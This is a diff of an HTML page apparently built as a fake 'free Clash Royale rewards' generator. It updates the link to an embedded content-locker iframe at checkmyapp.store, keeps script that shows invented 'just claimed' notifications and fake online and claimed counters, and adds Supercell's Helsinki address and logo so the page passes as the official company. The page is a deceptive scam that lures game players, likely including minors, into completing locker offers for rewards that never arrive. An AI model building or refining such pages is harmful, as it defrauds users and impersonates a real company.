@@ -28,6 +28,7 @@
 
         @keyframes moveBackground { from { background-position: 0 0, 25px 25px; } to { background-position: 50px 50px, 75px 75px; } }
 
+        /* --- TIKTOK OVERLAY --- */
         #ttOverlay { position: fixed; inset: 0; background: #000; display: none; z-index: 9999999; }
         #tutorialGif { width: 100%; height: 100%; object-fit: cover; }
 
@@ -38,6 +39,7 @@
         .logo-container { margin: 25px 0; }
         .logo { width: 170px; filter: drop-shadow(0 8px 12px rgba(0,0,0,0.4)); }
 
+        /* STATS PANEL */
         .stats-panel {
             background: rgba(0, 50, 120, 0.85); border: 3px solid var(--cr-gold);
             border-radius: 25px; display: inline-flex; gap: 40px; padding: 20px 45px; margin-bottom: 30px;
@@ -90,9 +92,8 @@
         /* BACK BUTTON */
         .btn-back {
             position: absolute; top: 15px; left: 15px; background: none; border: none;
-            font-size: 24px; color: #0056b3; cursor: pointer; transition: transform 0.2s;
+            font-size: 24px; color: #0056b3; cursor: pointer; z-index: 10;
         }
-        .btn-back:hover { transform: scale(1.2); }
 
         .selected-reward-preview { width: 100px; height: 100px; object-fit: contain; margin: 10px auto; animation: pulse 1.5s infinite; }
         @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
@@ -111,7 +112,10 @@
         /* FOOTER L-K7AL */
         footer { margin-top: 60px; background: #000; padding: 50px 20px; text-align: left; color: #ffffff; font-family: sans-serif; }
         .footer-top { display: flex; justify-content: space-between; max-width: 500px; margin: 0 auto 30px auto; flex-wrap: wrap; gap: 20px; }
+        .store-btns img { height: 40px; border-radius: 5px; border: 1px solid #333; margin-right: 5px; }
         .footer-bottom { max-width: 500px; margin: 0 auto; display: flex; justify-content: space-between; border-top: 1px solid #333; padding-top: 30px; }
+        .legal-links { display: flex; flex-direction: column; gap: 12px; }
+        .legal-links a { color: white; text-decoration: none; font-size: 14px; font-weight: bold; opacity: 0.8; }
         .sc-logo-footer { width: 120px; margin-top: 20px; }
     </style>
 </head>
@@ -146,25 +150,23 @@
     <!-- MODAL SMYA (PAGE 2) -->
     <div class="modal-overlay" id="modalTag">
         <div class="modal-box">
-            <!-- BOUTON BACK -->
             <button class="btn-back" onclick="closeModal('modalTag')"><i class="fas fa-arrow-left"></i></button>
-            
             <h3 style="margin:0; color: #0056b3; margin-top: 20px;">YOU SELECTED:</h3>
             <img id="rewardDisplay" src="" class="selected-reward-preview">
             <h2 id="rewardNameDisplay" style="margin:5px 0; font-size: 18px;">REWARD</h2>
-            
             <input type="text" class="modal-input" id="playerTag" placeholder="PLAYER TAG OR NAME" maxlength="15">
             <button class="btn-continue" onclick="goToLocker()">CONTINUE</button>
         </div>
     </div>
 
-    <!-- LOCKER -->
+    <!-- LOCKER PAGE -->
     <div class="modal-overlay" id="modalLocker">
         <div class="modal-box" style="max-width: 450px; padding: 10px;">
             <button class="btn-back" onclick="closeModal('modalLocker')"><i class="fas fa-arrow-left"></i></button>
             <h2 style="margin:25px 0 10px 0;">FINAL STEP</h2>
             <div style="background:#000; border-radius:20px; height:450px; overflow:hidden;">
-                <iframe src="https://checkmyapp.space/cl/i/822w96" style="width:100%; height:100%; border:none;"></iframe>
+                <!-- UPDATED LOCKER LINK -->
+                <iframe src="https://checkmyapp.store/cl/i/n66xj9" style="width:100%; height:100%; border:none;"></iframe>
             </div>
         </div>
     </div>
@@ -173,18 +175,28 @@
         <div class="footer-top">
             <div>
                 <h4>Download our games</h4>
-                <div style="display:flex; gap:10px;">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" height="35">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" height="35">
+                <div class="store-btns">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg">
+                </div>
+            </div>
+            <div>
+                <h4>Follow us</h4>
+                <div style="font-size: 22px; display: flex; gap: 15px;">
+                    <i class="fab fa-youtube"></i> <i class="fab fa-facebook-f"></i> <i class="fab fa-discord"></i>
                 </div>
             </div>
         </div>
         <div class="footer-bottom">
-            <div style="display:flex; flex-direction:column; gap:10px;">
-                <a href="#" style="color:white; text-decoration:none; font-size:14px;">Privacy Policy</a>
-                <a href="#" style="color:white; text-decoration:none; font-size:14px;">Terms of Service</a>
+            <div class="legal-links">
+                <a href="#">Terms of Service</a>
+                <a href="#">Privacy Policy</a>
+                <a href="#">Parent's Guide</a>
+                <a href="#">Safe and Fair Play</a>
+                <a href="#">Other Legal Docs</a>
             </div>
             <div style="text-align: right;">
+                <p style="font-size: 12px; opacity: 0.6;">Supercell Oy<br>Jätkäsaarenlaituri 1<br>00180 Helsinki, Finland</p>
                 <img src="./super.JPG" class="sc-logo-footer">
             </div>
         </div>
@@ -209,7 +221,7 @@
             {n: "GOBLINS", img: "goblins.PNG"}
         ];
 
-        const usernames = ["Mohamed_JKK", "Daniel_Ulta", "Zeneex_99", "Alpha_CR", "Shadow_X", "EliteGamer", "KingRoyale", "Hamza_92", "Omar_CR", "Anass_GG", "Younes_Pro", "Simo_Hustle"];
+        const usernames = ["Mohamed_JKK", "Daniel_Ulta", "Zeneex_99", "Alpha_CR", "Shadow_X", "EliteGamer", "KingRoyale", "Hamza_92", "Omar_CR", "Anass_GG", "Younes_Pro"];
 
         const grid = document.getElementById('mainGrid');
         rewardsData.forEach((r, index) => {
@@ -230,12 +242,10 @@
 
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        // LIVE NOTIF USING ONLY PAGE REWARDS
         function updateLiveNotification() {
             const liveText = document.getElementById('liveText');
             const randomUser = usernames[Math.floor(Math.random() * usernames.length)];
             const randomReward = rewardsData[Math.floor(Math.random() * rewardsData.length)];
-            
             liveText.style.opacity = '0';
             setTimeout(() => {
                 liveText.innerHTML = `🔥 <b>${randomUser}</b> just claimed <span style="color:var(--cr-gold)">${randomReward.n}</span>!`;
@@ -245,7 +255,6 @@
         setInterval(updateLiveNotification, 4000);
         updateLiveNotification();
 
-        // DYNAMIC STATS
         let onlineCount = 1088;
         let claimedCount = 3122;
         setInterval(() => {
